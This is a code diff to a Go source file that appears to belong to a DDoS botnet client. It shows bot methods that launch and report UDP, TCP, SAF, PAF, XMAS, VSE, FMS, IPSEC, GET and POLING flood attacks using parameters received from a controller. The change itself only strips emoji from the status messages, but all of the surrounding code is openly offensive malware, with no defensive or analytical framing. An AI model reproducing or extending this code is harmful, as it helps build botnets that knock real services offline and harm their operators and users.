@@ -64,7 +64,7 @@ func setAttackSwitch() {
 }
 
 func (b *Bot) UDP() {
-	b.Report("🗡 START UDP FLOOD ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START UDP FLOOD ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -78,14 +78,14 @@ func (b *Bot) UDP() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP UDP FLOOD ATTACKING!!!")
+			b.Report("STOP UDP FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) TCP() {
 	storeOpt := strings.ToUpper(ComdSetup(4, "-"))
-	b.Report("🗡 START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
+	b.Report("START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
 	if setCall, setKey := SetupCaller(); setKey {
 		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
 			a := &Attack{
@@ -107,13 +107,13 @@ func (b *Bot) TCP() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP TCP[" + storeOpt + "] FLOOD ATTACKING!!!")
+			b.Report("STOP TCP[" + storeOpt + "] FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) SAF() {
-	b.Report("🗡 START SAF FLOOD ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START SAF FLOOD ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -129,13 +129,13 @@ func (b *Bot) SAF() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP SAF FLOOD ATTACKING!!!")
+			b.Report("STOP SAF FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) PAF() {
-	b.Report("🗡 START PAF FLOOD ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START PAF FLOOD ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -151,13 +151,13 @@ func (b *Bot) PAF() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP PAF FLOOD ATTACKING!!!")
+			b.Report("STOP PAF FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) XMAS() {
-	b.Report("🗡 START XMAS FLOOD ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START XMAS FLOOD ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -177,13 +177,13 @@ func (b *Bot) XMAS() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP XMAS FLOOD ATTACKING!!!")
+			b.Report("STOP XMAS FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) VSE() {
-	b.Report("🗡 START VSE ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START VSE ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -197,13 +197,13 @@ func (b *Bot) VSE() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP VSE ATTACKING!!!")
+			b.Report("STOP VSE ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) FMS() {
-	b.Report("🗡 START FMS ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START FMS ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -217,13 +217,13 @@ func (b *Bot) FMS() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP FMS ATTACKING!!!")
+			b.Report("STOP FMS ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) IPSEC() {
-	b.Report("🗡 START IPSEC ATTACK: " + Recv(*BotReader, 5))
+	b.Report("START IPSEC ATTACK: " + Recv(*BotReader, 5))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
@@ -237,13 +237,13 @@ func (b *Bot) IPSEC() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP IPSEC ATTACKING!!!")
+			b.Report("STOP IPSEC ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) GET() {
-	b.Report("🗡 START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
+	b.Report("START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
@@ -256,13 +256,13 @@ func (b *Bot) GET() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP GET FLOOD ATTACKING!!!")
+			b.Report("STOP GET FLOOD ATTACKING!!!")
 		}
 	}
 }
 
 func (b *Bot) POLING() {
-	b.Report("🗡 START POLING FLOOD ATTACK: " + Recv(*BotReader, 4))
+	b.Report("START POLING FLOOD ATTACK: " + Recv(*BotReader, 4))
 	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
@@ -275,7 +275,7 @@ func (b *Bot) POLING() {
 	}
 	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
-			b.Report("🛎 STOP POLING FLOOD ATTACKING!!!")
+			b.Report("STOP POLING FLOOD ATTACKING!!!")
 		}
 	}
 }
